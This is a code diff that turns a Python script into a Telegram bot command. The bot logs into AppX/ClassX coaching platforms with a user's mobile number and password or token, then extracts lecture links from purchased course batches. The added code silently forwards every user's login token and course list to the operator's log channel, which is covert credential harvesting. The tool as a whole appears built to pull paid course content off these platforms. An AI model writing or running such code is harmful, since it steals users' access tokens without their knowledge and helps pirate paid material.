@@ -1,17 +1,25 @@
 import requests
 import json
 import cloudscraper
+from pyrogram import filters
+from Extractor import app
 import os
 import asyncio
 import aiohttp
 import base64
 from Crypto.Cipher import AES
+from Extractor.modules.mix import v2_new
 from Crypto.Util.Padding import unpad
 from base64 import b64decode
 from bs4 import BeautifulSoup
-import time
+from concurrent.futures import ThreadPoolExecutor
+import time 
+from config import CHANNEL_ID
 
-# Concurrent requests rate limiter
+log_channel = CHANNEL_ID
+log_channel2 = CHANNEL_ID
+
+# Concurrent requests rate limiter (Server crash/block se bachane ke liye)
 SEMAPHORE = asyncio.Semaphore(5)
 
 # Default Fallback User ID
@@ -82,6 +90,43 @@ async def fetch(session, url, headers):
                 await asyncio.sleep(1)
         return {}
 
+async def handle_course(session, api_base, bi, si, sn, topic, hdr1):
+    ti = topic.get("id") or topic.get("topicid") or topic.get("topic_id")
+    tn = topic.get("name") or topic.get("topic_name") or "Topic"
+    
+    url_live = f"{api_base}/get/livecourseclassbycoursesubtopconceptapiv3?courseid={bi}&subjectid={si}&topicid={ti}&conceptid=&start=-1"
+    url_db = f"{api_base}/get/dbcourseclassbycoursesubtopconceptapiv3?courseid={bi}&subjectid={si}&topicid={ti}&conceptid=&start=-1"
+    
+    r3_live, r3_db = await asyncio.gather(
+        fetch(session, url_live, hdr1),
+        fetch(session, url_db, hdr1),
+        return_exceptions=True
+    )
+    
+    video_data = []
+    if isinstance(r3_live, dict) and r3_live.get("data"):
+        video_data.extend(r3_live.get("data", []))
+    if isinstance(r3_db, dict) and r3_db.get("data"):
+        video_data.extend(r3_db.get("data", []))
+
+    # Duplicate videos ko remove karna
+    seen_ids = set()
+    unique_videos = []
+    for v in video_data:
+        v_id = v.get("id") or v.get("video_id")
+        if v_id and v_id not in seen_ids:
+            seen_ids.add(v_id)
+            unique_videos.append(v)
+
+    tasks = [process_video(session, api_base, bi, si, sn, ti, tn, video, hdr1) for video in unique_videos]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    
+    clean_results = []
+    for lines in results:
+        if isinstance(lines, list) and lines:
+            clean_results.extend(lines)
+    return clean_results
+
 async def process_video(session, api_base, bi, si, sn, ti, tn, video, hdr1):
     vi = video.get("id") or video.get("video_id")
     lines = []
@@ -148,95 +193,147 @@ async def process_video(session, api_base, bi, si, sn, ti, tn, video, hdr1):
         print(f"Error processing video ID {vi}: {str(e)}")
         return None
 
-async def handle_course(session, api_base, bi, si, sn, topic, hdr1):
-    ti = topic.get("id") or topic.get("topicid") or topic.get("topic_id")
-    tn = topic.get("name") or topic.get("topic_name") or "Topic"
-    
-    url_live = f"{api_base}/get/livecourseclassbycoursesubtopconceptapiv3?courseid={bi}&subjectid={si}&topicid={ti}&conceptid=&start=-1"
-    url_db = f"{api_base}/get/dbcourseclassbycoursesubtopconceptapiv3?courseid={bi}&subjectid={si}&topicid={ti}&conceptid=&start=-1"
-    
-    r3_live, r3_db = await asyncio.gather(
-        fetch(session, url_live, hdr1),
-        fetch(session, url_db, hdr1),
-        return_exceptions=True
-    )
-    
-    video_data = []
-    if isinstance(r3_live, dict) and r3_live.get("data"):
-        video_data.extend(r3_live.get("data", []))
-    if isinstance(r3_db, dict) and r3_db.get("data"):
-        video_data.extend(r3_db.get("data", []))
+@app.on_message(filters.command(["appx"]))
+async def appex_v4_txt(app, message):
+    api = await app.ask(message.chat.id, text="**SEND APPX API Without https://\n\n✅ Example:\ntcsexamzoneapi.classx.co.in or rozgarapinew.teachx.in**")
+    api_txt = api.text.strip()
+    name = api_txt.split('.')[0].replace("api", "") if api_txt else api_txt.split('.')[0]
+    if "." in api_txt:
+        await appex_v5_txt(app, message, api_txt, name)
+    else:
+        await app.send_message(message.chat.id, "❌ **INVALID API INPUT.** Please enter a valid API domain.")
 
-    seen_ids = set()
-    unique_videos = []
-    for v in video_data:
-        v_id = v.get("id") or v.get("video_id")
-        if v_id and v_id not in seen_ids:
-            seen_ids.add(v_id)
-            unique_videos.append(v)
-
-    tasks = [process_video(session, api_base, bi, si, sn, ti, tn, video, hdr1) for video in unique_videos]
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    
-    clean_results = []
-    for lines in results:
-        if isinstance(lines, list) and lines:
-            clean_results.extend(lines)
-    return clean_results
-
-async def extract_batch_txt(api_domain, token, batch_ids_input):
-    """
-    Direct function to extract batch lectures and write to TXT file using token.
-    :param api_domain: Example 'tcsexamzoneapi.classx.co.in' or 'rozgarapinew.teachx.in'
-    :param token: Pure Bearer/AppX Token string
-    :param batch_ids_input: List of Batch IDs e.g. ['123', '456'] or single ID e.g. '123'
-    """
-    api_base = api_domain.replace("http://", "https://") if api_domain.startswith(("http://", "https://")) else f"https://{api_domain}"
+async def appex_v5_txt(app, message, api, name):
+    api_base = api.replace("http://", "https://") if api.startswith(("http://", "https://")) else f"https://{api}"
     app_name = api_base.replace("https://", "").replace("http://", "").split('.')[0].capitalize()
     
-    userid = extract_userid_from_token(token)
+    input1 = await app.ask(message.chat.id, f"SEND MOBILE NUMBER AND PASSWORD IN THIS FORMAT\n\n`MOBILE*PASSWORD`\n\nᴄᴏᴀᴄʜɪɴɢ ɴᴀᴍᴇ:- **{app_name}**\n\nOR DIRECTLY SEND YOUR **TOKEN**")
+    raw_text = input1.text.strip()
+    
+    userid = DEFAULT_USER_ID
+    token = ""
+    
+    if '*' in raw_text:
+        email, password = raw_text.split("*", 1)
+        raw_url = f"{api_base}/post/userLogin"
+        headers = get_headers("", "-2")
+        headers["Content-Type"] = "application/x-www-form-urlencoded"
+        data = {"email": email, "password": password}
+        
+        try:
+            response = requests.post(raw_url, data=data, headers=headers, timeout=15).json()
+            status = response.get("status")
+
+            if status == 200:
+                userid = str(response["data"]["userid"])
+                token = response["data"]["token"]
+            elif status == 203:
+                second_api_url = f"{api_base}/post/userLogin?extra_details=0"
+                second_data = {
+                    "source": "website",
+                    "phone": email,
+                    "email": email,
+                    "password": password,
+                    "extra_details": "1"
+                }
+                second_response = requests.post(second_api_url, headers=headers, data=second_data, timeout=15).json()
+                if second_response.get("status") == 200:
+                    userid = str(second_response["data"]["userid"])
+                    token = second_response["data"]["token"]
+        except Exception as e:
+            print(f"Login error: {str(e)}")
+            return await message.reply_text("❌ Login failed. Incorrect Credentials or API endpoint.")
+    else:
+        # Token Login with Automatic User-ID Parsing
+        token = raw_text
+        userid = extract_userid_from_token(token)
+
+    if not token:
+        return await message.reply_text("❌ Invalid Token or Credentials provided.")
+
     hdr1 = get_headers(token, userid)
 
     scraper = cloudscraper.create_scraper() 
+    mc1 = {}
     try:
         res = scraper.get(f"{api_base}/get/mycoursev2?userid={userid}", headers=hdr1, timeout=15)
+        
         if res.status_code != 200:
-            print(f"❌ Server Error ({res.status_code}): Token is invalid or expired.")
-            return
+            return await message.reply_text(f"❌ **Server Error ({res.status_code}):** Token is invalid or expired.")
+            
         mc1 = res.json()
+    except json.JSONDecodeError:
+        return await message.reply_text("❌ **Response Error:** Received non-JSON response from server.")
     except Exception as e:
-        print(f"❌ Connection Error: {str(e)}")
-        return
+        return await message.reply_text(f"❌ **Connection Error:** `{str(e)}`")
+    
+    FFF = "𝗕𝗔𝗧𝗖𝗛 𝗜𝗗 ➤ 𝗕𝗔𝗧𝗖𝗛 𝗡𝗔𝗠𝗘\n\n"
+    valid_ids = []
 
     raw_courses = mc1.get("data", [])
-    if not isinstance(raw_courses, list) or len(raw_courses) == 0:
-        print("❌ No purchased courses found for this Token/User-ID.")
+    if isinstance(raw_courses, list) and len(raw_courses) > 0:
+        for ct in raw_courses:
+            ci = str(ct.get("id") or ct.get("course_id") or ct.get("courseid"))
+            cn = ct.get("course_name") or ct.get("title") or ct.get("name") or "Untitled Batch"
+            FFF += f"**`{ci}`   -   `{cn}`**\n\n"
+            valid_ids.append(ci)
+    else:
+        return await message.reply_text("❌ **NO BATCH PURCHASED OR EXPIRED TOKEN/USER-ID.**")
+
+    dl = f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅ for {app_name}\nURL: {api_base}\n\nToken: `{token}`\n\n{FFF}"
+    if len(FFF) <= 4096:
+        try:
+            await app.send_message(log_channel, dl)
+        except Exception:
+            pass
+        editable1 = await message.reply_text(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅\n\n{FFF}")      
+    else:
+        plain_FFF = FFF.replace("**", "").replace("`", "")
+        file_path = f"{app_name}.txt"
+        with open(file_path, "w", encoding="utf-8") as file:
+            file.write(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅ for {app_name}\n\nToken: {token}\n\n{plain_FFF}")
+
+        await app.send_document(
+            message.chat.id,
+            document=file_path,
+            caption="Too many batches! Select batch IDs from the text file."
+        )
+        editable1 = None
+
+    input2 = await app.ask(
+        message.chat.id, 
+        "**Send Batch ID(s) separated by '&' to download, or copy the all-batch sequence below:**\n\n`" + "&".join(valid_ids) + "`"
+    )
+
+    batch_ids = [batch.strip() for batch in input2.text.strip().split("&") if batch.strip() in valid_ids]
+
+    if not batch_ids:
+        await message.reply_text("❌ **Invalid Batch ID(s).**")
         return
 
-    # Normalize batch IDs
-    if isinstance(batch_ids_input, str):
-        selected_ids = [b.strip() for b in batch_ids_input.split("&") if b.strip()]
-    else:
-        selected_ids = [str(b).strip() for b in batch_ids_input]
+    m1 = await message.reply_text("⏳ **Processing requested batch(es)...**")
 
-    for raw_text2 in selected_ids:
-        print(f"🔄 Extracting batch `{raw_text2}`...")
+    for raw_text2 in batch_ids:
+        m2 = await message.reply_text(f"🔄 **Extracting batch `{raw_text2}`...**")
         start_time = time.time()
         
         course_info = next((ct for ct in raw_courses if str(ct.get("id") or ct.get("course_id") or ct.get("courseid")) == raw_text2), {})
         course_name = course_info.get("course_name") or course_info.get("title") or "Course"
+        start = course_info.get("start_date", "N/A")
+        end = course_info.get("end_date", "N/A")
+        pricing = course_info.get("price", "N/A")
 
-        sanitized_name = course_name.replace(':', '_').replace('/', '_').replace(' ', '_')
-        filename = f"{raw_text2}_{sanitized_name}.txt"
+        filename1 = f"{raw_text2}_{course_name.replace(':', '_').replace('/', '_')}.txt".replace(" ", "_")
 
         async with aiohttp.ClientSession() as session:
-            with open(filename, 'w', encoding='utf-8') as f:
+            with open(filename1, 'w', encoding='utf-8') as f:
                 try:
                     r1 = await fetch(session, f"{api_base}/get/allsubjectfrmlivecourseclass?courseid={raw_text2}&start=-1", hdr1)
-                    subjects = r1.get("data", [])
                     
+                    subjects = r1.get("data", [])
                     if not subjects:
-                        print(f"⚠️ No subjects found for Batch ID: {raw_text2}")
+                        sanitized_course_name = course_name.replace(':', '_').replace('/', '_')
+                        await v2_new(app, message, token, userid, hdr1, app_name, raw_text2, api_base, sanitized_course_name, start_time, start, end, pricing, input2, m1, m2)
                         continue
 
                     for subject in subjects:
@@ -254,23 +351,36 @@ async def extract_batch_txt(api_domain, token, batch_ids_input):
                                 f.writelines(data)
     
                 except Exception as e:
-                    print(f"❌ Error processing course {raw_text2}: {str(e)}")
+                    print(f"Error processing course: {str(e)}")
+                    sanitized_course_name = course_name.replace(':', '_').replace('/', '_')
+                    await v2_new(app, message, token, userid, hdr1, app_name, raw_text2, api_base, sanitized_course_name, start_time, start, end, pricing, input2, m1, m2)
                     continue
                 
             end_time = time.time()
             elapsed_time = end_time - start_time
-            
-            if os.path.exists(filename) and os.path.getsize(filename) > 0:
-                print(f"✅ Extracted Successfully! Saved as '{filename}' (Time: {elapsed_time:.1f}s)")
-            else:
-                print(f"⚠️ No lecture links found for Batch `{raw_text2}`.")
+        
+            c_text = (
+                f"**APP NAME: {app_name}**\n"
+                f"**Batch Name:** {raw_text2}_{course_name}\n"
+                f"**Validity Start:** {start}\n"
+                f"**Validity Ends:** {end}\n"
+                f"**Time Taken:** {elapsed_time:.1f}s\n"
+                f"**Batch Price:** {pricing}"
+            )
+        
+            try:
+                if os.path.exists(filename1) and os.path.getsize(filename1) > 0:
+                    await app.send_document(message.chat.id, filename1, caption=c_text)
+                else:
+                    await message.reply_text(f"⚠️ No lectures found for Batch `{raw_text2}`.")
+            except Exception as e:
+                print(f"Error sending document: {str(e)}")
+            finally:
+                if os.path.exists(filename1):
+                    os.remove(filename1)
 
-# --- Script Runner / Usage Example ---
-if __name__ == "__main__":
-    # Custom Input Section
-    API_DOMAIN = input("Enter API Domain (e.g. tcsexamzoneapi.classx.co.in): ").strip()
-    USER_TOKEN = input("Enter your AppX Bearer Token: ").strip()
-    BATCH_ID = input("Enter Batch ID (or multiple separated by '&'): ").strip()
-
-    # Async Event Loop Execution
-    asyncio.run(extract_batch_txt(API_DOMAIN, USER_TOKEN, BATCH_ID))
+    try:
+        await m1.delete(True)
+        await m2.delete(True)
+    except Exception:
+        pass
